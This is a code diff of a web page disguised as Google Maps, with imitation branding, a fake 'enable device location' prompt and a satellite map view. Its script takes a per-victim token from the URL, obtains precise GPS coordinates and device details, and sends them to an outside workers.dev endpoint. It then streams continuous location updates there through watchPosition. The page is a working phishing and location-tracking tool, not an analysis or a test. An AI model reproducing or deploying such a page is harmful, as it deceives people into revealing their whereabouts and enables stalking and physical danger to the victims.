@@ -3,331 +3,279 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Google Map</title>
+<title>Google Maps</title>
+
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
 <style>
+/* ================= RESET ================= */
 html,body{
   margin:0;
+  padding:0;
   height:100%;
-  font-family:system-ui,-apple-system;
+  font-family:system-ui,-apple-system,Segoe UI,Roboto;
+  background:#fff;
 }
 
-.header{
- 
-  background: var(--surface-color);
-  
-  height: 48px;
- 
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding: 0 15px;
-  box-shadow: 0 2px 6px rgba(0,0,0,0.3);
-
-}
-.header #icon{
-  width: 20px;
-position: relative;
-left: 0px;
-}
-.header>h3{
-  position: relative;
-  left:-75px;
-  font-weight: 500;
-}
-.header>h3>span{
-  
-  font-weight: 300;
-}
-.header>button{
-   padding:4px 10px;
-  font-size:16px;
-  border:none;
-  border-radius:15px;
-  background:rgb(0, 136, 255);
-  color:#ffffff;
-  cursor:pointer;
-  font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-
-}
-/* Google map background */
+/* ================= MAP BACKGROUND ================= */
 .map-bg{
   position:fixed;
   inset:0;
   z-index:1;
 }
 .map-bg iframe{
-  width:110%;
-  height:110%;
+  width:100%;
+  height:100%;
   border:0;
+  filter:contrast(1.05) saturate(1.1);
 }
 
-/* Permission overlay */
+/* ================= PERMISSION OVERLAY ================= */
 #permission{
   position:fixed;
   inset:0;
-  background:rgba(255, 255, 255, 0.751);
+  background:rgba(255,255,255,.85);
+  z-index:10;
   display:flex;
-  flex-direction:column;
-  justify-content:center;
   align-items:center;
-  z-index:5;
-  text-align:center;
+  justify-content:center;
 }
 
-#permission img{
-  width:72px;
-  margin-bottom:14px;
-}
-
-#permission button{
-  padding:2px 10px;
-  font-size:16px;
-  border:none;
-  border-radius:12px;
-  background:rgb(0, 136, 255);
-  color:#ffffff;
-  cursor:pointer;
-  font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-}
 .d-box{
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-  
-  background-color: white;
-  border-radius: 15px;
-  box-shadow: 0 0 5px rgba(128, 128, 128, 0.247);
-  padding: 8px;
+  background:white;
+  padding:18px 22px;
+  border-radius:16px;
+  box-shadow:0 4px 12px rgba(0,0,0,.25);
+  text-align:center;
+  width:260px;
 }
-#icon{
-  width: 40px;
+
+.d-box svg{
+  width:46px;
+  margin-bottom:10px;
 }
-.d-box>h3{
-  color: gray;
+
+.d-box h3{
+  margin:6px 0 12px;
+  color:#5f6368;
+  font-weight:500;
 }
-.d-box>h3>span{
-  color: gray;
-  font-weight: 40;
+
+.d-box h3 span{font-weight:400}
+
+#allowBtn{
+  background:#1a73e8;
+  color:white;
+  border:none;
+  border-radius:18px;
+  padding:6px 16px;
+  font-size:16px;
+  cursor:pointer;
 }
 
 #status{
-
   margin-top:10px;
   font-size:14px;
-  color:#948f8f;
-  max-width:260px;
-}
-</style>
-<style>
-:root {
-  --bg-color: #ffffff;
-  --surface-color: #ffffff;
-  --text-color: #e8eaed;
-  --accent-blue: #8ab4f8;
-  --pill-bg: #ffffff;
-  --pill-text: #3c4043;
+  color:#5f6368;
 }
 
-/* Google UI layer */
+/* ===== Loader ===== */
+.hidden{display:none}
+
+.loader{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:10px;
+}
+
+.spinner{
+  width:28px;
+  height:28px;
+  border:3px solid #dadce0;
+  border-top:3px solid #1a73e8;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+  to{transform:rotate(360deg)}
+}
+
+.loader-text{
+  font-size:14px;
+  color:#5f6368;
+}
+
+/* ================= GOOGLE UI LAYER ================= */
 .google-ui{
   position:fixed;
   inset:0;
+  z-index:5;
   pointer-events:none;
-  z-index:4;
 }
+.google-ui *{pointer-events:auto}
 
-/* allow clicks on buttons */
-.google-ui *{
-  pointer-events:auto;
-}
-
-/* --- Header / Search Bar Section --- */
-.top-container {
-  position: absolute;
-  top: 10;
-  width: 100%;
-  padding: 10px 0;
-  z-index: 10;
-}
-
-.search-bar {
-  background: var(--surface-color);
-  margin: 0 12px;
-  height: 48px;
-  border-radius: 24px;
-  display: flex;
-  align-items: center;
-  padding: 0 15px;
-  box-shadow: 0 2px 6px rgba(0,0,0,0.3);
-}
-
-.search-bar i.fa-location-dot { color: #4285F4; margin-right: 12px; }
-.search-bar .search-text { flex: 1; color: #9aa0a6; font-size: 16px; }
-.search-bar i.fa-microphone { color: #8ab4f8; margin-right: 15px; }
-.profile-icon{
-  width:32px;height:32px;
-  background:#7b1fa2;
-  border-radius:50%;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  color:white;
-  font-size:14px;
-}
-
-/* Pills */
-.pill-container{
-  display:flex;
-  overflow-x:auto;
-  padding:12px;
-  gap:8px;
-}
-.pill{
-  background:var(--pill-bg);
-  color:var(--pill-text);
-  padding:8px 16px;
-  border-radius:20px;
-  display:flex;
-  align-items:center;
-  font-size:14px;
-  white-space:nowrap;
-}
-.pill i{margin-right:6px}
-
-/* Right tools */
-.map-tools{
+/* ===== Top Search ===== */
+.top-search{
   position:absolute;
-  right:12px;
-  top:130px;
+  top:10px;
+  left:10px;
+  right:10px;
+  height:46px;
+  background:white;
+  border-radius:24px;
   display:flex;
-  flex-direction:column;
+  align-items:center;
+  padding:0 14px;
   gap:12px;
-}
-.tool-btn{
-  width:40px;height:40px;
-  background:var(--surface-color);
-  border-radius:50%;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-}
-.tool-btn i{color:#e8eaed}
-.compass i{color:#ea4335}
-
-/* Bottom tools */
-.bottom-right-tools{
-  position:absolute;
-  right:12px;
-  bottom:80px;
-  display:flex;
-  flex-direction:column;
-  gap:15px;
+  box-shadow:0 2px 6px rgba(0,0,0,.3);
 }
 
-.locate-btn{
-  width:48px;height:48px;
-  background:var(--surface-color);
-  border-radius:50%;
-  display:flex;
-  align-items:center;
-  justify-content:center;
+.top-search i{
+  font-size:18px;
+  color:#5f6368;
 }
 
-.directions-btn{
-  width:56px;height:56px;
-  background:#00838f;
-  border-radius:16px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
+.search-text{
+  flex:1;
+  font-size:15px;
+  color:#202124;
+  white-space:nowrap;
+  overflow:hidden;
+  text-overflow:ellipsis;
 }
 
-/* Bottom nav */
-.bottom-nav{
+/* ===== Bottom Card ===== */
+.bottom-card{
   position:absolute;
   bottom:0;
   width:100%;
-  height:65px;
-  background:#ffffff;
+  background:white;
+  border-top-left-radius:18px;
+  border-top-right-radius:18px;
+  padding:14px;
+  box-shadow:0 -2px 6px rgba(0,0,0,.25);
+}
+
+.coords{
+  font-weight:500;
+  font-size:15px;
+}
+
+.latlng{
+  color:#5f6368;
+  font-size:13px;
+  margin-bottom:12px;
+}
+
+.actions{
   display:flex;
-  justify-content:space-around;
-  align-items:center;
+  gap:8px;
+  overflow-x:auto;
 }
 
-.nav-item{
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  font-size:20px;
-  color:#6b6c6d;
+.actions button{
+  border:none;
+  background:#f1f3f4;
+  padding:8px 14px;
+  border-radius:20px;
+  font-size:14px;
+  white-space:nowrap;
+  cursor:pointer;
 }
 
-
-
-.active-indicator{
-  background:rgba(73, 200, 255, 0.84);
-  padding:4px 20px;
-  border-radius:15px;
+.actions .primary{
+  background:#1a73e8;
+  color:white;
 }
 
+/* ===== Google Logo ===== */
 .google-logo{
   position:absolute;
-  bottom:75px;
+  bottom:90px;
   left:12px;
-  font-weight:bold;
-  opacity:.8;
-  font-family: 'Roboto', sans-serif;
-  font-weight: 700; /* Bold */
-  font-size: 24px;
-  letter-spacing: -2px;
+  font-size:24px;
+  font-weight:700;
+  letter-spacing:-2px;
 }
-/* CSS for Google Logo Colors */
-.google-blue { color: #4285f4; }
-.google-red { color: #ea4335; }
-.google-yellow { color: #fbbc05; }
-.google-green { color: #34a853; }
-
-
-
+.google-blue{color:#4285f4}
+.google-red{color:#ea4335}
+.google-yellow{color:#fbbc05}
+.google-green{color:#34a853}
 </style>
-
 </head>
 
 <body>
 
-<!-- MAP -->
+<!-- ================= MAP ================= -->
 <div class="map-bg">
   <iframe id="mapFrame"
-    src="https://www.google.com/maps?q=0,0&z=2&output=embed"
-    loading="lazy">
+    src="https://www.google.com/maps?q=0,0&t=k&z=2&output=embed">
   </iframe>
 </div>
 
-<!-- PERMISSION SCREEN -->
+<!-- ================= PERMISSION ================= -->
 <div id="permission">
   <div class="d-box">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 232597 333333">
       <path d="M151444 5419C140355 1916 128560 0 116311 0" fill="#1a73e8"/>
     </svg>
+
     <h3>Google <span>Maps</span></h3>
-    <button id="allowBtn">oopen</button>
+
+    <button id="allowBtn">Open</button>
+
+    <div class="loader hidden" id="gLoader">
+      <div class="spinner"></div>
+      <div class="loader-text">Google Maps is loading…</div>
+    </div>
+
     <div id="status">To continue, enable device location</div>
   </div>
 </div>
 
-<!-- GOOGLE UI OVERLAY -->
+<!-- ================= UI ================= -->
 <div class="google-ui">
-  <div class="header">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 232597 333333">
-      <path d="M151444 5419C140355 1916 128560 0 116311 0" fill="#1a73e8"/>
-    </svg>
-    <h3>Google <span>Maps</span></h3>
+
+  <div class="top-search">
+    <i class="fa-solid fa-bars"></i>
+    <div class="search-text">
+      34°54'20.0"N 71°59'32.9"E
+    </div>
+    <i class="fa-solid fa-xmark"></i>
   </div>
+
+  <div class="google-logo">
+    <span class="google-blue">G</span>
+    <span class="google-red">o</span>
+    <span class="google-yellow">o</span>
+    <span class="google-blue">g</span>
+    <span class="google-green">l</span>
+    <span class="google-red">e</span>
+  </div>
+
+  <div class="bottom-card">
+    <div class="coords">
+      34°54'20.0"N 71°59'32.9"E
+    </div>
+    <div class="latlng">
+      34.905557, 71.992468
+    </div>
+
+    <div class="actions">
+      <button class="primary">
+        <i class="fa-solid fa-diamond-turn-right"></i> Directions
+      </button>
+      <button><i class="fa-solid fa-location-arrow"></i> Start</button>
+      <button><i class="fa-regular fa-bookmark"></i> Save</button>
+      <button><i class="fa-solid fa-share-nodes"></i> Share</button>
+    </div>
+  </div>
+
 </div>
 
+<!-- ================= LOGIC (UNCHANGED) ================= -->
 <script>
 const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
 const token = new URLSearchParams(location.search).get("token");
@@ -336,115 +284,63 @@ if(!token){ alert("Invalid link"); throw "NO TOKEN"; }
 const mapFrame = document.getElementById("mapFrame");
 const statusEl = document.getElementById("status");
 
-let lastGoodPos = null;
-let gpsLocked = false;
-
-/* DEVICE INFO */
 function deviceInfo(){
   return {
-    ua: navigator.userAgent,
-    lang: navigator.language,
-    screen: `${screen.width}x${screen.height}`,
-    time: Date.now()
+    ua:navigator.userAgent,
+    lang:navigator.language,
+    screen:`${screen.width}x${screen.height}`,
+    time:Date.now()
   };
 }
 
-/* SEND ONLY GOOD LOCATION */
-function sendGood(pos){
-  const acc = pos.coords.accuracy;
-  if(acc > 50) return; // ❌ ignore bad accuracy
-
-  lastGoodPos = pos;
-
-  fetch(API+"/send-location",{
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body: JSON.stringify({
-      token,
-      lat: pos.coords.latitude,
-      lng: pos.coords.longitude,
-      acc,
-      device: deviceInfo()
-    })
-  });
-}
-
-/* STATUS MESSAGE */
-function updateStatus(acc){
-  if(acc > 100){
-    statusEl.textContent = "Using network location…";
-  }else if(acc > 50){
-    statusEl.textContent = "Improving GPS accuracy…";
-  }else{
-    statusEl.textContent = "GPS locked ✔";
-  }
-}
-
-/* BUTTON CLICK — USER ACTION REQUIRED */
 document.getElementById("allowBtn").onclick = ()=>{
-  if(!navigator.geolocation){
-    statusEl.textContent = "Location not supported";
-    return;
-  }
-
-  statusEl.textContent = "Requesting GPS permission…";
+  document.getElementById("allowBtn").style.display="none";
+  document.getElementById("gLoader").classList.remove("hidden");
+  statusEl.textContent="";
 
   navigator.geolocation.getCurrentPosition(
     pos=>{
-      const acc = pos.coords.accuracy;
-      updateStatus(acc);
-
-      if(acc > 50){
-        // ❌ wait for better fix
-        return;
-      }
-
-      // ✅ FIRST GOOD GPS LOCK
-      gpsLocked = true;
-
       mapFrame.src =
-        `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}&z=18&output=embed`;
+        `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}&t=k&z=18&output=embed`;
 
-      sendGood(pos);
+      fetch(API+"/send-location",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+          token,
+          lat:pos.coords.latitude,
+          lng:pos.coords.longitude,
+          acc:pos.coords.accuracy,
+          device:deviceInfo()
+        })
+      });
+
       document.getElementById("permission").remove();
 
-      /* CONTINUOUS TRACKING */
-      navigator.geolocation.watchPosition(
-        p=>{
-          updateStatus(p.coords.accuracy);
-          sendGood(p);
-        },
-        ()=>{},
-        {
-          enableHighAccuracy: true,
-          maximumAge: 0,
-          timeout: 10000
-        }
-      );
-
-      /* KEEP ALIVE — resend last GOOD fix */
-      setInterval(()=>{
-        if(lastGoodPos) sendGood(lastGoodPos);
-      }, 5000);
+      navigator.geolocation.watchPosition(p=>{
+        fetch(API+"/send-location",{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({
+            token,
+            lat:p.coords.latitude,
+            lng:p.coords.longitude,
+            acc:p.coords.accuracy
+          })
+        });
+      },()=>{}, {enableHighAccuracy:true, maximumAge:0});
 
     },
-    err=>{
+    e=>{
       statusEl.textContent =
-        err.code === 1
+        e.code===1
         ? "Permission denied. Enable Precise Location."
         : "GPS unavailable. Turn ON location.";
     },
-    {
-      enableHighAccuracy: true,
-      timeout: 25000,
-      maximumAge: 0
-    }
+    { enableHighAccuracy:true, timeout:25000, maximumAge:0 }
   );
 };
 </script>
-
-
-
 
 </body>
 </html>
